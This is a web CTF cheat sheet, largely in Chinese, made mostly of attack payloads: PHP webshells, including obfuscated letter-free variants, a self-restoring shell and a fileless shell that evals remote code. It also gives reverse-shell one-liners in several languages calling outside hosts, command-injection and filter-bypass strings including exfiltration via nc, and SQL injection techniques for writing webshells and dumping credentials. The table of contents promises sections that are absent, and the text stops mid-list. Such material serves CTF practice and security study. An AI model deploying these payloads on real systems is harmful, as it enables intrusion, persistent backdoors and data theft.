WEB CTF CheatSheet
===

Table of Contents
=================

*  [Webshell](#webshell)
    * [Reverse Shell](#reverse-shell)
*  [PHP Tag](#php-tag)
*  [PHP Weak Type](#php-weak-type)
*  [PHP Feature](#php-其他特性)
*  [Command Injection](#command-injection)
    * [Bypass Space](#空白绕过)
    * [Bypass Keyword](#keyword绕过)
    * [ImageMagick](#imagemagick-imagetragick)
    * [Ruby Command Executing](#ruby-command-executing)
    * [Python Command Executing](#python-command-executing)
*  [SQL Injection](#sql-injection)
    * [MySQL](#mysql)
    * [MSSQL](#mssql)
    * [Oracle](#oracle)
    * [SQLite](#sqlite)
    * [Postgresql](#postgresql)
*  [LFI](#lfi)
*  [Upload](#上传漏洞)
*  [Serialization](#反序列化)
    * [PHP Serialize](#php---serialize--unserialize)
    * [Python Pickle](#python-pickle)
    * [Ruby Marshal](#rubyrails-marshal)
    * [Ruby ML](#rubyrails-yaml)
*  [SSTI](#ssti)
    * [Flask/Jinja2](#flaskjinja2)
    * [AngularJS](#angularjs)
    * [Vue.js](#vuejs)
    * [Python](#python)
    * [Tool](#tool)
*  [SSRF](#ssrf)
    * [Bypass](#bypass-127001)
    * [Local Expolit](#本地利用)
    * [Remote Expolit](#远程利用)
    * [CRLF Injection](#crlf-injection)
    * [Finger Print](#fingerprint)
*  [XXE](#xxe)
    * [Out of Band XXE](#out-of-band-oob-xxe)
*  [XSS](#xss)
*  [Crypto](#密码学)
    * [PRNG](#prng)
    * [ECB mode](#ecb-mode)
    * [CBC mode](#cbc-mode)
    * [Length Extension Attack](#length-extension-attack)
*  [Others](#其它-1)
*  [Tools and Website](#tool--online-website)
    * [Information Gathering](#information-gathering)
    * [Social Engineering](#social-engineering)
    * [Crack](#crack)


# Webshell
```php
<?php system($_GET["cmd"]); ?>
<?php system($_GET[1]); ?>
<?php system("`$_GET[1]`"); ?>
<?= system($_GET[cmd]);
<?=`$_GET[1]`;
<?php eval($_POST[cmd]);?>
<?php echo `$_GET[1]`;
<?php echo passthru($_GET['cmd']);
<?php echo shell_exec($_GET['cmd']);
<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
<script language="php">system("id"); </script>

<?php $_GET['a']($_GET['b']); ?>
// a=system&b=ls
// a=assert&b=system("ls")

<?php array_map("ass\x65rt",(array)$_REQUEST['cmd']);?>
// .php?cmd=system("ls")

<?@extract($_REQUEST);@die($f($c));?>
// .php?f=system&c=id

<?php @include($_FILES['u']['tmp_name']);  
// 构造 <form action="http://x.x.x.x/shell.php" method="POST" enctype="multipart/form-data">上传
// 把暂存档include进来
// From: http://www.zeroplace.cn/article.asp?id=906

<?php $x=~¾¬¬º­«;$x($_GET['a']); ?>
// not backdoor (assert)
// .php?a=system("ls")

echo "{${phpinfo()}}";

echo "${system(ls)}";

echo Y2F0IGZsYWc= | base64 -d | sh
// Y2F0IGZsYWc=   =>  cat  flag

echo -e "<?php passthru(\$_POST[1])?>;\r<?php echo 'A PHP Test ';" > shell.php
// cat shell.php
// <?php echo 'A PHP Test ';" ?>

echo ^<?php eval^($_POST['a']^); ?^> > a.php
// Windows echo导出一句话

<?php fwrite(fopen("gggg.php","w"),"<?php system(\$_GET['a']);");

<?php
header('HTTP/1.1 404');
ob_start();
phpinfo();
ob_end_clean();
?>

<?php 
// 无回显后门  
// e.g. ?pass=file_get_contents('http://rs.panja.cc/test')
ob_start('assert');
echo $_REQUEST['pass'];
ob_end_flush();
?>

// 无英文数字的webshell 1
<?=
$💩 = '[[[[@@' ^ '("(/%-';
$💩(('@@['^'#!/')." /????");

// 无英文数字的webshell 2
<?php
$_=(chr(0x01)^'`').(chr(0x13)^'`').(chr(0x13)^'`').(chr(0x05)^'`').(chr(0x12)^'`').(chr(0x14)^'`');
$__='_'.(chr(0x0D)^']').(chr(0x2F)^'`').(chr(0x0E)^']').(chr(0x09)^']');
$___=$$__;
$_($___[_]);// assert($_POST[_]);
?>

// 无英文数字的webshell 3
<?php
$_=(urldecode('%01')^'`').(urldecode('%13')^'`').(urldecode('%13')^'`').(urldecode('%05')^'`').(urldecode('%12')^'`').(urldecode('%14')^'`');
$__='_'.(urldecode('%0D')^']').(urldecode('%2F')^'`').(urldecode('%0E')^']').(urldecode('%09')^']');
$___=$$__;
$_($___[_]);// assert($_POST[_]);
?>

// 无英文数字的webshell 4
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;
$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});

// 无英文数字的webshell 5
$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});
$_=$$_____;
$____($_[_]);// assert($_POST[_]);

// 无英文数字的webshell 6
<?php
$__=[];
$___=[];
$_=$__==$___;
$__=~(瞰);
$___=$__[$_];
$__=~(北);
$___.=$__[$_].$__[$_];
$__=~(的);
$___.=$__[$_];
$__=~(半);
$___.=$__[$_];
$__=~(拾);
$___.=$__[$_];
$____=~(~(_));
$__=~(说);
$____.=$__[$_];
$__=~(小);
$____.=$__[$_];
$__=~(次);
$____.=$__[$_];
$__=~(站);
$____.=$__[$_];
$_=$$____;
$___($_[_]);// assert($_POST[_]);

// 无英文数字的webshell 7
<?php
    @$_=[].'';
    @$___=$_[''];
    $_=$___;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;
    $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;
    $____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;
    @$___($_[_]);// assert($_POST[_]);
?>


A=fl;B=ag;cat $A$B


// math函数webshell 8
<?php
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){1}(($$pi){2})&1=system&2=cat%20flag.php
?>

```

## webshell 内存驻留

解法：restart
```php
<?php
    ignore_user_abort(true);  // 忽略连线中断
    set_time_limit(0);  // 设定无执行时间上限
    $file = 'shell.php';
    $code = '<?php eval($_POST[a]);?>';
    while(md5(file_get_contents($file)) !== md5($code)) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>

```

## 无文件webshell

解法：restart
```php
<?php  
    unlink(__FILE__);  
    ignore_user_abort(true);  
    set_time_limit(0);  
    $remote_file = 'http://xxx/xxx.txt';  
    while($code = file_get_contents($remote_file)){  
        @eval($code);  
        sleep(5);  
    };  

?>  
```


## Reverse Shell

- 本机Listen Port
    - `ncat -vl 1234`

- Perl
    - `perl -e 'use Socket;$i="rs.panja.cc";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

- Bash
    - `bash -i >& /dev/tcp/rs.panja.cc/1234 0>&1`
    - `bash -c 'bash -i >& /dev/tcp/rs.panja.cc/1234 0>&1'`
    - `0<&196;exec 196<>/dev/tcp/rs.panja.cc/1234; sh <&196 >&196 2>&196`

- PHP
    - `php -r '$sock=fsockopen("rs.panja.cc",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

- NC
    - `nc -e /bin/sh rs.panja.cc 1234`

- Telnet
    - `mknod backpipe p && telnet kaibro.tw 5566 0<backpipe | /bin/bash 1>backpipe`

- Python
    - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("rs.panja.cc",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- Ruby 
    - `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("kaibro.tw","5566");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`

- Node.js
    - `var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(1234, "rs.panja.cc", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});`
    - `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/rs.panja.cc/1234 0>&1'");`

- Powershell
    - `powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c kaibro.tw -p 5566 -e cmd`

# PHP Tag

- `<? ?>`
    - short_open_tag 决定是否可使用短标记
    - 或是编译php时 --enable-short-tags
- `<?=`
    - 等价 <? echo
    - 自`PHP 5.4.0`起，always work!
- `<% %>`、`<%=`
    - 自`PHP 7.0.0`起，被移除
    - 须将`asp_tags`设成On
- `<script language="php"`
    - 自`PHP 7.0.0`起，被移除
    - `<script language="php">system("id"); </script>`



# PHP Weak Type

- `var_dump('0xABCdef'       == '     0xABCdef');`
    * true           (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false)
- `var_dump('0010e2'         == '1e3’);`
    - true
- `strcmp([],[])`
    - 0
- `sha1([])`
    - NULL
- `'123' == 123`
- `'abc' == 0`
- `'123a' == 123`
- `'0x01' == 1`
    - PHP 7.0后，16进制字符串不再当成数字
    - e.g `var_dump('0x01' == 1)` => false
- `'' == 0 == false == NULL`
- `md5([1,2,3]) == md5([4,5,6]) == NULL`
    - 可用在登入绕过 (用户不存在，则password为NULL)
- `var_dump(md5(240610708));`
    - 0e462097431906509019562988736854
- `var_dump(sha1(10932435112));`
    - 0e07766915004133176347055865026311692244
- `$a="123"; $b="456"`
    - `$a + $b == "579";`
    - `$a . $b == "123456"`

- `$a = 0; $b = 'x';`
    - `$a == false` => true
    - `$a == $b` => true
    - `$b == true` => true

- `$a = 'a'`
    - `++$a` => `'b'`
    - `$a+1` => `1`


# PHP 其他特性

## Overflow

- 32位
    - `intval('1000000000000')` => `2147483647`
- 64位
    - `intval('100000000000000000000')` => `9223372036854775807`

## 浮点数精度

- `php -r "var_dump(1.000000000000001 == 1);"`
    - false

- `php -r "var_dump(1.0000000000000001 == 1);"`
    - true

- `$a = 0.1 * 0.1; var_dump($a == 0.01);`
    - false

## ereg会被NULL截断

- `var_dump(ereg("^[a-zA-Z0-9]+$", "1234\x00-!@#%"));`
    - `1`
- `ereg`和`eregi`在PHP 7.0.0.已经被移除

## intval

- 四舍五入
    - `var_dump(intval('5278.8787'));`
        - `5278`
- `intval(012)` => 10
- `intval("012")` => 12

## extract变量覆盖

- `extract($_GET);`
    - `.php?_SESSION[name]=admin`
    - `echo $_SESSION['name']` => 'admin'

## trim

- 会把字符串前后的空白(或其他字元)去掉
- 未指定第二参数，预设会去掉以下字元
    - `" "` (0x20)
    - `"\t"` (0x09)
    - `"\n"` (0x0A)
    - `"\x0B"` (0x0B)
    - `"\r"` (0x0D)
    - `"\0"` (0x00)
- 可以发现预设不包含`"\f"` (0x0C)
    - 比较：is_numeric()允许`\f`在开头
- 如果参数是unset或空的变量，返回值是空字符串

## is_numeric

- `is_numeric(" \t\r\n 123")` => `true`

- `is_numeric(' 87')` => `true`
- `is_numeric('87 ')` => `false`
- `is_numeric(' 87 ')` => `false`
- `is_numeric('0xdeadbeef')`
    - PHP >= 7.0.0 => `false`
    - PHP < 7.0.0 => `true`
    - 可以拿来绕过注入
- 以下亦为合法(返回True)字符串:
    - `' -.0'`
    - `'0.'`
    - `' +2.1e5'`
    - `' -1.5E+25'`
    - `'1.e5'`

## in_array

- `in_array('5 or 1=1', array(1, 2, 3, 4, 5))`
    - true
- `in_array('kaibro', array(0, 1, 2))`
    - true
- `in_array(array(), array('kai'=>false))`
    - true
- `in_array(array(), array('kai'=>null))`
    - true
- `in_array(array(), array('kai'=>0))`
    - false
- `in_array(array(), array('kai'=>'bro'))`
    - false
- `in_array('kai', array('kai'=>true))`
    - true
- `in_array('kai', array('kai'=>'bro'))`
    - false
- `in_array('kai', array('kai'=>0))`
    - true
- `in_array('kai', array('kai'=>1))`
    - false

## array_search

- `mixed array_search(mixed $needle , array $haystack [, bool $strict = false ])`
    - 在`haystack`数组中，搜寻`needle`的值，成功则返回index，失败返回False
- `$strict`为false时，采用不严格比较
    - 预设是False
- Example
    - `$arr=array(1,2,0); var_dump(array_search('kai', $arr))`
        - `int(2)`
    - `$arr=array(1,2,0); var_dump(array_search('1', $arr))`
        - `int(0)`

## parse_str
- `parse_str(string, array)`
- 会把查询字符串解析到变量中
- 如果未设置第二个参数，会解析到同名变量中
    - PHP7.2中不设置第二个参数会产生`E_DEPRECATED`警告
- `parse_str('gg[kaibro]=1234');`

    ```
    array(1) {
      ["kaibro"]=>
        string(4) "1234"
    }

    ```
- PHP变量有空格和.，会被转成底线
    
    ```
    parse_str("na.me=kaibro&pass wd=ggininder",$test);
    var_dump($test);
    
    array(2) { 
        ["na_me"]=> string(6) "kaibro" 
        ["pass_wd"]=> string(9) "ggininder" 
    } 
    ```


## parse_url

- 在处理传入的URL会有问题
- `parse_url('/a.php?id=1')`
    
    ```
    array(2) {
      ["host"]=>
        string(5) "a.php"
      ["query"]=>
        string(4) "id=1"
    }
    ```
- `parse_url('//a/b')`
    - host: `a`
- `parse_url('..//a/b/c:80')`
    - host: `..`
    - port: `80`
    - path: `//a/b/c:80`
- `parse_url('///a.php?id=1')`
    - false

- `parse_url('/a.php?id=1:80')`
     - PHP < 7.0.0
         - `false`
     - PHP >= 7.0.0
       ```
         array(2) { 
             ["path"]=> string(6) "/a.php" 
             ["query"]=> string(7) "id=1:80" 
         }
       ```

- `parse_url('http://rs.panja.cc:87878')`
    - 5.3.X版本以下
        ```php
        array(3) { 
            ["scheme"]=> string(4) "http" 
            ["host"]=> string(9) "rs.panja.cc" 
            ["port"]=> int(22342) 
        }
        ```
    - 其他： false

## preg_replace

- `mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )`
    - 搜寻`$subject`中匹配的`$pattern`，并用`$replacement`替换
- 第一个参数用`/e`修饰符，`$replacement`会被当成PHP code执行
    - 必须有匹配到才会执行
    - PHP 5.5.0起，会产生`E_DEPRECATED`错误
    - PHP 7.0.0不再支持，用`preg_replace_callback()`代替

example:

```php
<?php
$a='phpkaibro';
echo preg_replace('/(.*)kaibro/e','\\1info()',$a);
```

## sprintf / vprintf

- 对格式化字符串的类型没检查
- 格式化字符串中%后面的字元(除了%之外)会被当成字符串类型吃掉
    - 例如`%\`、`%'`、`%1$\'`
    - 在某些SQLi过滤状况下，`%' and 1=1#`中的单引号会被转义成`\'`，`%\`又会被吃掉，`'`成功逃逸
    - 原理：sprintf实作是用switch...case...
        - 碰到未知类型，`default`不处理

## file_put_contents

- 第二个参数如果是数组，PHP会把它串接成字符串
- example:
    ```php
    <?php
    $test = $_GET['txt'];
    if(preg_match('[<>?]', $test)) die('bye');
    file_put_contents('output', $test);
    ```
    - 可以直接`?txt[]=<?php phpinfo(); ?>`写入

## spl_autoload_register

- `spl_autoload_register()`可以自动载入Class
- 不指定参数，会自动载入`.inc`和`.php`
- Example:
    - 如果目录下有kaibro.inc，且内容为class Kaibro{...}
    - 则`spl_autoload_register()`会把这个Class载入进来


## 路径正规化

- `a.php/.`
    - `file_put_contents("a.php/.", "<?php phpinfo() ?>");`
        - 可成功写入
            - 经测试Windows可以覆写、Linux无法
        - 可以绕过一些正规表达式判断
    - `file_get_contents("a.php/.");`
        - 经测试Windows下可成功读、Linux无法
    - 还有很多其他function也适用
- `"` => `.`
    - `a"php`
- `>` => `?`
    - `a.p>p`
    - `a.>>>`
- `<` => `*`
    - `a.<`

## URL query decode
- `$_GET`会对传入的参数做URLdecode再返回
- `$_SERVER['REQUEST_URI']`和`$_SERVER['QUERY_STRING']`则是直接返回

Example:

Request: `http://rs.panja.cc/test.php?url=%67%67`
    
* $_GET: `[url] => gg`

* $_SERVER['REQUEST_URI']: `/test.php?url=%67%67`
    
* $_SERVER['QUERY_STRING']: `url=%67%67`

## OPcache

- 透过将PHP脚本编译成Byte code的方式做Cache来提升性能
- 相关设定在php.ini中
    - `opcache.enable` 是否启用
    - `opcache.file_cache` 设定cache目录
        - 例如:`opcache.file_cache="/tmp/opcache"`
        - `/var/www/index.php`的暂存会放在`/tmp/opcache/[system_id]/var/www/index.php.bin`
    - `opcache.file_cache_only` 设定cache文件优先级
    - `opcache.validate_timestamps` 是否启用timestamp验证
- `system_id`是透过Zend和PHP版本号计算出来的，可以确保相容性
- 所以在某些条件下可透过上传覆盖暂存文件来写webshell
    - system_id要和目标机器一样
    - timestamp要一致
- https://github.com/GoSecure/php7-opcache-override
    - Disassembler可以把Byte code转成Pseudo code

## PCR回溯次数限制绕

- PHP的PCRE库使用NFA作为正则表达式引擎
    - NFA在匹配不上时，会回溯尝试其它状态
- PHP为防止DOS，设定了PCRE回溯次数上限
    - `pcre.backtrack_limit`
    - 默认值`1000000`
- 回溯次数超过上限时，`preg_match()`会返回`false`
- Example
    - Code-Breaking Puzzles - pcrewaf

## 利用命名空间特性劫持函数

- 调用函数时，PHP会在当前命名空间递归向下搜索该函数
    - a/b/c 命名空间下调用f，会搜索 a/b/c/f -> a/b/f -> a/f -> builtins/f
- 最先搜索到的函数会优先加载
- 基于此特性，可以打一个monkey patch来劫持底层函数


## 其他

- 大小写不敏感
    - `<?PhP sYstEm(ls);`
- `echo (true ? 'a' : false ? 'b' : 'c');`
    - `b`
- ```echo `whoami`; ```
    - `kaibro`
- 正则表达式`.`不匹配换行字元`%0a`
- 运算优先权问题
- 正则表达式常见错误:
    - `preg_match("/\\/", $str)`
    - 匹配反斜杠应该要用`\\\\`而不是`\\`
- 运算优先级问题
        upstream/master
    - `$a = true && false;`
        - `$a` => `false`
    - `$a = true and false;`
        - `$a` => `true`
- chr()
    - 大于256会mod 256
    - 小于0会加上256的倍数，直到>0
    - Example:
        - `chr(259) === chr(3)`
        - `chr(-87) === chr(169)`

- 递增
    - `$a="9D9"; var_dump(++$a);`
        - `string(3) "9E0"`
    - `$a="9E0"; var_dump(++$a);`
        - `float(10)`

- 算数运算绕Filter
    - `%f3%f9%f3%f4%e5%ed & %7f%7f%7f%7f%7f%7f`
        - `system`
        - 可用在限制不能出现英数字时 or 过滤某些特殊符号
    - ```$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');```
        - `assert`
    - 其他
        - `~`, `++`等运算，也都可用类似概念构造

- 花括号
    - 数组、字符串元素存取可用花括号
    - `$array{index}`同`$array[index]`

- filter_var
    - `filter_var('http://evil.com;google.com', FILTER_VALIDATE_URL)`
        - False
    - `filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)`
        - True

- json_decode
    - 不直接吃换行字符和\t字符
    - 但可以吃'\n'和'\t'
        - 会转成换行字符和Tab
    - 也吃`\uxxxx`形式
        - `json_decode('{"a":"\u0041"}')`


- === bug
    - `var_dump([0 => 0] === [0x100000000 => 0])`
        - 某些版本会是True
        - ASIS 2018 Qual Nice Code
    - https://3v4l.org/sUEMG
- openssl_verify
    - 预测採用SHA1来做签名，可能有SHA1 Collision问题
    - DEFCON CTF 2018 Qual
- Namespace
    - PHP的預設Global space是`\`
    - e.g. `\system('ls');`

# Command Injection

```
| cat flag
&& cat flag
; cat flag
%0a cat flag
"; cat flag
`cat flag`
cat $(ls)
"; cat $(ls)
`cat flag | nc rs.panja.cc 5278`

. flag
PS1=$(cat flag)

`echo${IFS}${PATH}|cut${IFS}-c1-1`
=> /
```

## ? and *
- `?` match one character
    - `cat fl?g`
    - `/???/??t /???/p??s??`
- `*` match 多个
    - `cat f*`
    - `cat f?a*`

## 空白绕过

- `${IFS}`
    - `cat${IFS}flag`
    - `ls$IFS-alh`
    - `cat$IFS$2flag`
- `cat</etc/passwd`
- `{cat,/etc/passwd}`
- `X=$'cat\x20/etc/passwd'&&$X`
- ``` IFS=,;`cat<<<uname,-a` ```
    - bash only


## Keyword绕过

- String Concat
    - `A=fl;B=ag;cat $A$B`
- Empty Variable
    - `cat fl${x}ag`
    - `cat tes$(z)t/flag`
    
- Environment Variable
    - `$PATH => "/usr/local/….blablabla”`
        - `${PATH:0:1}   => '/'`
        - `${PATH:1:1}   => 'u'`
        - `${PATH:0:4}   => '/usr'`
    - `${PS2}` 
        - `>`
    - `${PS4}`
        - `+`
- Empty String
    - `cat fl""ag`
    - `cat fl''ag`
        - `cat "fl""ag"`

- 反斜线
    - `c\at fl\ag`

## ImageMagick (ImageTragick)

- CVE-2016-3714
- `mvg`格式包含https处理(使用curl下载)，可以闭合双引号
- payload:

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://rs.panja.cc";ls "-la)'
pop graphic-context
```

## Ruby Command Executing

- `open("| ls")`
- `IO.popen("ls").read`
- `Kernel.exec("ls")`
- ``` `ls` ```
- `system("ls")`
- `eval("ruby code")`
    - Non-Alphanumeric example: HITCON CTF 2015 - Hard to say
        - `$$/$$` => 1
        - `'' << 97 << 98 << 99` => "abc"
        - `$:`即`$LOAD_PATH`
- `exec("ls")`
- `%x{ls}`
- Net::FTP
    - CVE-2017-17405
    - use `Kernel#open`

## Python Command Executing
- `os.system("ls")`
- `os.popen("ls").read()`
- `os.execl("/bin/ls","")`
- `os.execlp("ls","")`
- `os.execv("/bin/ls",[''])`
- `os.execvp("/bin/ls",[""])`
- `subprocess.call("ls")`
    - `subprocess.call("ls|cat",shell=False)` => Fail
    - `subprocess.call("ls|cat",shell=True)` => Correct
- `eval("__import__('os').system('ls')")`
- `exec("__import__('os').system('ls')")`
- `commands.getoutput('ls')`

## Read File

- diff /etc/passwd /flag
- paste /flag
- bzmore /flag
- bzless /flag
- static-sh /flag
- ...

# SQL Injection


## MySQL

- 子字符串：
    - `substr("abc",1,1) => 'a'`
    - `mid("abc", 1, 1)  => 'a'`
- Ascii function
    - `ascii('A') => 65 `
- Char function
    - `char(65) => 'a'`
- Concatenation
    - `CONCAT('a', 'b') => 'ab'`
        - 如果任何一栏为NULL，则返回NULL
    - `CONCAT_WS(分隔符, 字符串1, 字符串2...)`
        - `CONCAT_WS('@', 'gg', 'inin')` => `gg@inin`
- Cast function
    - `CAST('125e342.83' AS signed) => 125`
    - `CONVERT('23',SIGNED) => 23`
- Delay function
    - `sleep(5)`
    - `BENCHMARK(count, expr)`
- 空白字符
    - `09 0A 0B 0C 0D A0 20`
- File-read function
    - `LOAD_FILE('/etc/passwd')`
- File-write
    - `INTO DUMPFILE`
        - 适用binary (写入同一行)
    - `INTO OUTFILE`
        - 适用一般文本 (有换行)
    - 写webshell
        - 需知道可写路径
        - `UNION SELECT "<? system($_GET[1]);?>",2,3 INTO OUTFILE "/var/www/html/temp/shell.php"`
    - 权限
        - `SELECT file_priv FROM mysql.user`
    - secure-file-priv
        - 限制MySQL导入导出
            - load_file, into outfile等
        - 运行时无法更改
        - MySQL 5.5.53前，该变量预设为空(可以导入导出)
        - e.g. `secure_file_priv=E:\`
            - 限制导入导出只能在E:\下
        - e.g. `secure_file_priv=null`
            - 限制不允许导入导出    
        - secure-file-priv限制下用general_log拿shell
        ```
        SET global general_log='on';

        SET global general_log_file='C:/phpStudy/WWW/cmd.php';

        SELECT '<?php assert($_POST["cmd"]);?>';
        ```
- IF语句
    - IF(condition,true-part,false-part)
    - `SELECT IF (1=1,'true','false')`
- Hex
    - `SELECT X'5061756c';  =>  paul`
    - `SELECT 0x5061756c; => paul`
    - `SELECT 0x5061756c+0 => 1348564332`
    - `SELECT load_file(0x2F6574632F706173737764);`
        - /etc/passwd
    - 可绕过一些WAF
        - e.g. 用在不能使用单引号时(`'` => `\'`)
         - CHAR()也可以达到类似效果
             - `'admin'` => `CHAR(97, 100, 109, 105, 110)`
- 注解：
    - `#`
    - `--`
    - `/**/`
        - 一个`*/`可以闭合前面多个`/*`
    - `/*! 50001 select * from test */`
        - 可探测版本
        - e.g. `SELECT /*!32302 1/0, */ 1 FROM tablename`
    - `
        - MySQL <= 5.5
    - `;%00`
        - PDO支持多语句
- information_schema
    - mysql >= 5.0
- Stacking Query
    - 预设PHP+MySQL不支持Stacking Query
    - 但PDO可以Stacking Query
- 其它：
    - @@version
        - 同version()
    - user()
        - current_user
        - current_user()
        - current user 
    - system_user()
        - database system user
    - database()
        - schema()
        - current database
    - @@basedir
        - MySQL安装路径
    - @@datadir
        - Location of db file
    - @@hostname
    - @@version_compile_os
        - Operating System
    - @@innodb_version
    - MD5()
    - SHA1()
    - COMPRESS() / UNCOMPRESS()
    - group_concat()
        - 合并多条结果
            - e.g. `select group_concat(username) from users;` 一次返回所有使用者名
    - greatest()
        - `greatest(a, b)`返回a, b中最大的
        - `greatest(1, 2)=2`
            - 1
        - `greatest(1, 2)=1`
            - 0
    - between a and b
        - 介于a到b之间
        - `greatest(1, 2) between 1 and 3`
            - 1
    - regexp
        - `SELECT 'abc' regexp '.*'`
            - 1
    - Collation
        - `*_ci` case insensitive collation 不区分大小写
        - `*_cs` case sensitive collation 区分大小写
        - `*_bin` binary case sensitive collation 区分大小写

- Union Based
    - 判断column数
        - `union select 1,2,3...N`
        - `order by N`
    - `AND 1=2 UNION SELECT 1, 2, password FROM admin--+`
    - `LIMIT N, M` 跳过前N条记录，取M条
    - 爆资料库名
        - `union select 1,2,schema_name from information_schema.schemata limit 1,1`
    - 爆表名
        - `union select 1,2,table_name from information_schema.tables where table_schema='mydb' limit 0,1`
        - `union select 1,2,table_name from information_schema.columns where table_schema='mydb' limit 0,1`
    - 爆Column名
        - `union select 1,2,column_name from information_schema.columns where table_schema='mydb' limit 0,1`
    - MySQL User
        - `SELECT CONCAT(user, ":" ,password) FROM mysql.user;`
- Error Based
    - 长度限制
        - 错误消息有长度限制
        - `#define ERRMSGSIZE (512)`
    - Overflow
        - MySQL > 5.5.5 overflow才会有错误消息
        - `SELECT ~0` => `18446744073709551615`
        - `SELECT ~0 + 1` => ERROR
        - `SELECT exp(709)` => `8.218407461554972e307`
        - `SELECT exp(710)` => ERROR
        - 若查询成功，会返回0
            - `SELECT exp(~(SELECT * FROM (SELECT user())x));`
            - `ERROR 1690(22003):DOUBLE value is out of range in 'exp(~((SELECT 'root@localhost' FROM dual)))'`
        - `select (select(!x-~0)from(select(select user())x)a);`
            - `ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'`
            - MySQL > 5.5.53 不会显示查询结果
    - xpath
        - extractvalue (有长度限制，32位)
            - `select extractvalue(1,concat(0x7e,(select @@version),0x7e));`
            - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
        - updatexml (有长度限制，32位)
            - `select updatexml(1,concat(0x7e,(select @@version),0x7e),1);`
            - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
    - 主键重复
        - `select count(*) from test group by concat(version(),floor(rand(0)*2));`
            - `ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'`
    - 其它函数 (5.7)
        - `select ST_LatFromGeoHash(version());`
        - `select ST_LongFromGeoHash(version());`
        - `select GTID_SUBSET(version(),1);`
        - `select GTID_SUBTRACT(version(),1);`
        - `select ST_PointFromGeoHash(version(),1);`
    - 爆库名、表名、字段名
        - 当过滤`information_schema`等关键字时，可以用下面方法爆库名
            - `select 1,2,3 from users where 1=abc();`
                - `ERROR 1305 (42000): FUNCTION fl4g.abc does not exist`
        - 爆表名
            - `select 1,2,3 from users where Polygon(id);`
            - ``select 1,2,3 from users where linestring(id);``
                - ```ERROR 1367 (22007): Illegal non geometric '`fl4g`.`users`.`id`' value found during parsing```
        - 爆Column
            - `select 1,2,3 from users where (select * from  (select * from users as a join users as b)as c);`
                - `ERROR 1060 (42S21): Duplicate column name 'id'`
            - `select 1,2,3 from users where (select * from  (select * from users as a join users as b using(id))as c);`
                - `ERROR 1060 (42S21): Duplicate column name 'username'`
- Blind Based (Time/Boolean)
    - Boolean
        - 「有」跟「没有」
        - `id=87 and length(user())>0`
        - `id=87 and length(user())>100`
        - `id=87 and ascii(mid(user(),1,1))>100`
        - `id=87 or ((select user()) regexp binary '^[a-z]')`
    - Time
        - 用在啥结果都看不到时
        - `id=87 and if(length(user())>0, sleep(10), 1)=1`
        - `id=87 and if(length(user())>100, sleep(10), 1)=1`
        - `id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1`
- 绕过空白检查
    - `id=-1/**/UNION/**/SELECT/**/1,2,3`
    - `id=-1%09UNION%0DSELECT%0A1,2,3`
    - `id=(-1)UNION(SELECT(1),2,3)`

- 宽字节注入
    - `addslashes()`会让`'`变`\'`
    - 在`GBK`编码中，中文字用两个Bytes表示
        - 其他多字节编码也可
        - 但要低位范围有包含`0x5c`(`\`)
    - 第一个Byte要>128才是中文
    - `%df'` => `%df\'` => `运'` (成功逃逸)

- Order by注入
